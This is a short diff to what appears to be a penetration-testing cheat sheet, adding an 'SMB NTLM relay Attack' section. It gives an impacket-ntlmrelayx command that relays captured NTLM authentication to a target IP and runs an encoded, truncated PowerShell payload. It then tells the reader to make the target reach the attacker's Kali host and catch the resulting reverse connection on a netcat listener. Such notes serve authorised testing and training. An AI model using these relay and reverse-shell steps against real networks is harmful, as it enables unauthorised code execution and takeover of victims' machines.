@@ -840,6 +840,19 @@ IconIndex=1
 ```
 Just Upload via SMB CLIENT and listen via Responder you will get the NTLM Hash !!
 
+### SMB NTLM relay Attack
+
+```
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
+
+here 192.168.50.242 is any external target address
+
+listen on 9999
+
+and in the target enter //kali_ip/test
+
+you will get connection from traget on net cat listner !!
+```
 
 
 ### LAPS or ReadLAPSPassword
